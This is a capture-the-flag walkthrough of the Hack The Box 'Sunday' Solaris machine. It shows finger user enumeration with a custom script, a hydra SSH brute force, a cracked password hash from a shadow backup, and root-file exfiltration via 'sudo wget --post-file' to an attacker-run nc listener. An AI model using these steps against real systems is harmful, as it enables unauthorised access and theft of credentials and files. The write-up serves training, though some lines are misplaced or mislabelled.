## Default Information
IP Address: 10.10.10.76\
OS: Solaris

## Background about Solaris

Soolaris is a Unix operating system that was developed by Sun Microsystems and is currently mostly used as an enterprise operating system in many industry softwares.
## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.76    sunday.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~/Desktop/htb_stuff]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.76 --rate=1000 -e tun0                1 ⨯
[sudo] password for kali: 
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-04 12:26:16 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 43397/tcp on 10.10.10.76                                  
Discovered open port 22022/tcp on 10.10.10.76                                  
Discovered open port 111/tcp on 10.10.10.76    
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. An additional Nmap scan on all the ports furthur revealed that port 79 is open and running on Sun Solaris finger.

From the scan, we can also see that there are no users that is currently logged into port 79. 

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 79	| finger | Sun Solaris fingerd | Open |
| 111	| rpcbind | 2-4 (RPC #100000) | Open |
| 22022	| SSH | SunSSH 1.3 (protocol 2.0) | Open |
| 43397	| unknown | unknown | Open |

Since there ports 80 and 443 are not open, there is no web service running on this machine. THis would mean that our exploitation would depend solely on the open ports.

Afterwards, we will also do a UDP scan of all the ports. However, the results obtained are not promising.

```
PORT      STATE         SERVICE         REASON
111/udp   open|filtered rpcbind         no-response
137/udp   open|filtered netbios-ns      no-response
518/udp   open|filtered ntalk           no-response
773/udp   open|filtered notify          no-response
5353/udp  open|filtered zeroconf        no-response
31335/udp open|filtered Trinoo_Register no-response
32773/udp open|filtered sometimes-rpc10 no-response
```
Afterwwards, we will use Nmap to scan for potential vulnerabilties on each of the ports, but we were unable to find anything related CVEs.
`
### Username Enumeration on Finger

Next, what we will do is a username enumeration on finger using a script I wrote.

```python
import subprocess
import numpy as np
import threading
import argparse

valid = []
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
def getUsernames(fileName):
	usernameFile = open(fileName,'r')
	usernames = []
	for username in usernameFile.readlines():
		usernames.append(username.strip())
	usernameFile.close()
	return usernames

def testFingerConnection(username,host):
	command = f"finger {username}@{host}"
	p = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
	isValidUser = True
	countNumber = 0
	for line in p.stdout.readlines():
		decodedLine = line.decode()
		number = decodedLine.count(username)
		countNumber = max(countNumber,number)
	if countNumber == 2:
		valid.append(username)
		return True
	else:
		return False

def threadProcess(array_chunk, host):
	for user in array_chunk:
		isValidUser = testFingerConnection(user,host)
		if isValidUser:
			print(bcolors.WARNING + f"{user}: Valid credentials" + bcolors.ENDC)
		else:
			print(f"{user}: Invalid credentials")
				
def logic(fileName, host, number_threads):
	users = getUsernames(fileName)
	array_chunk = np.array_split(users, number_threads)
	threadList = []
	for threadNumber in range(number_threads):
		thread = threading.Thread(target=threadProcess, args=(array_chunk[threadNumber], host),)
		threadList.append(thread)
		threadList[threadNumber].start()
	
	for thread in threadList:
		thread.join()
	
	print(bcolors.OKCYAN + "\nValid credentials are:" + bcolors.ENDC)
	count = 1
	for x in valid:
		print(str(count) + "." + x)
		count += 1
		
if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-host', help='Target host', required=True)
	parser.add_argument('-threads', help='Number of threads', required=True)
	parser.add_argument('-file', help='File location',required=True)
	args = parser.parse_args()
	
	logic(args.file, args.host, int(args.threads))
```

From the output, we get that the valid credentials are ```he``` and ```sunny```. However, manual inspection showed that ```he``` is a false positive.

```                                                                               
┌──(kali㉿kali)-[~/Desktop]
└─$ finger sunny@10.10.10.76 
Login       Name               TTY         Idle    When    Where
sunny    sunny                 pts/3        <Apr 24, 2018> 10.10.14.4               console      <Jul 31, 2020>
                                                                                        
┌──(kali㉿kali)-[~/Desktop]
└─$ finger he@10.10.10.76                                                           1 ⨯
Login       Name               TTY         Idle    When    Where
he 
```

## Exploit

### SSH into Sunny
Since we know that a user ```sunny``` exists. We will first try to SSH using ```sunny```. However, for this case we have to specify the port number as the SSH port is 22022 instead of the default 22. Also, we realize that we would require a password to SSH into the user ```sunny```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -p 22022 -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76      1 ⚙
Password:
```

Using hydra, we were able to brute force the password for ```sunny``` to be ```sunday```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -l sunny -P rockyou.txt 10.10.10.76 -s 22022 -t 4 ssh -vV  
[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "billybob" - 2381 of 602049 [child 1] (0/6)
[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "theman" - 2382 of 602049 [child 1] (0/6)
[ATTEMPT] target 10.10.10.76 - login "sunny" - pass "sunday" - 2383 of 602049 [child 0] (0/6)
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
[STATUS] attack finished for 10.10.10.76 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

### Privilege Escalation

First, we will execute sudo -l command to check the privileges of the user. We realize that we can execute ```/root/troll``` with root privileges. However, executing the command, we realize that all it does is to print the the output of an ```id``` command

```
sunny@sunday:~$ sudo -l 
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)
sunny@sunday:~$ 
```

Next, we try to find out the users on this terminal using /etc/passwd command. From the output, we realize that there is another user sammy on this terminal. 

```
sunny@sunday:~$ cat /etc/passwd
root:x:0:0:Super-User:/root:/usr/bin/bash
daemon:x:1:1::/:
bin:x:2:2::/usr/bin:
sys:x:3:3::/:
adm:x:4:4:Admin:/var/adm:
lp:x:71:8:Line Printer Admin:/usr/spool/lp:
uucp:x:5:5:uucp Admin:/usr/lib/uucp:
nuucp:x:9:9:uucp Admin:/var/spool/uucppublic:/usr/lib/uucp/uucico
dladm:x:15:3:Datalink Admin:/:
smmsp:x:25:25:SendMail Message Submission Program:/:
listen:x:37:4:Network Admin:/usr/net/nls:
gdm:x:50:50:GDM Reserved UID:/:
zfssnap:x:51:12:ZFS Automatic Snapshots Reserved UID:/:/usr/bin/pfsh
xvm:x:60:60:xVM User:/:
mysql:x:70:70:MySQL Reserved UID:/:
openldap:x:75:75:OpenLDAP User:/:
webservd:x:80:80:WebServer Reserved UID:/:
postgres:x:90:90:PostgreSQL Reserved UID:/:/usr/bin/pfksh
svctag:x:95:12:Service Tag UID:/:
nobody:x:60001:60001:NFS Anonymous Access User:/:
noaccess:x:60002:60002:No Access User:/:
nobody4:x:65534:65534:SunOS 4.x NFS Anonymous Access User:/:
sammy:x:101:10:sammy:/export/home/sammy:/bin/bash
sunny:x:65535:1:sunny:/export/home/sunny:/bin/bash
```
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

Running Linpeas, we are able to discover a /backup/shadow.backup file. Upon futhur analysis,  we are able to find sammy's password hashes there.

```
sunny@sunday:~$ cat /backup/shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

### Cracking the hash

Before we start cracking the hash, let's try to identify the hash type. The hash was identified to be SHA-256 Crypt, and the hashcat mode for this is 7400

```
┌──(kali㉿kali)-[~/Desktop]
└─$ hashid -m '$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB'             2 ⚙
Analyzing '$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB'
[+] SHA-256 Crypt [Hashcat Mode: 7400]
```

Using hashcat, we will crack the hash.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat ~/.hashcat/hashcat.potfile
$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:cooldude!
```

### SSH into Sammy
Next, we will be able to SSH as ```sammy```, using the password obtained previously.

```
┌──(kali㉿kali)-[~]
└─$ ssh -p 22022 -oKexAlgorithms=+diffie-hellman-group1-sha1 sammy@10.10.10.76
Password: 
Last login: Fri Jul 31 17:59:59 2020
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
```

### Obtaining user flag
```
sammy@sunday:~$ cd Desktop
sammy@sunday:~/Desktop$ ls -la
total 6
drwxr-xr-x  2 sammy staff  4 2018-04-15 20:37 .
drwxr-xr-x 18 sammy staff 27 2020-07-31 18:00 ..
-rw-r--r--  1 sammy staff  0 2018-04-15 20:15 .os-icons-installed
-r--------  1 sammy staff 33 2018-04-15 20:37 user.txt
sammy@sunday:~/Desktop$ cat user.txt
<Redacted user flag
sammy@sunday:~/Desktop$ 
```
### Obtaining root flag

First, we will check the permissions of the sammy using sudo -l and it turns out that we can execute wget commands with root privileges.

```
sammy@sunday:~/Desktop$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

Knowing that we can execute wget with root privileges, we will use wget to send the root flag to our local machine using the ```wget --pos-file```
```
sammy@sunday:~$ sudo /usr/bin/wget --post-file=/root/root.txt 10.10.16.4
--19:39:18--  http://10.10.16.4/
           => `index.html'
Connecting to 10.10.16.4:80... failed: Connection refused.
sammy@sunday:~$ sudo wget --post-file=/root/root.txt 10.10.16.4:4000
--19:40:39--  http://10.10.16.4:4000/
           => `index.html'
Connecting to 10.10.16.4:4000... connected.
HTTP request sent, awaiting response... 
```

On the local machine, we will create a reverse shell that writes the contents of the root flag to the file ```root```. Viewng the ```root``` file gives us the root flag.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 4000 > root
listening on [any] 4000 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.76] 60822
```
### Obtaining root flag
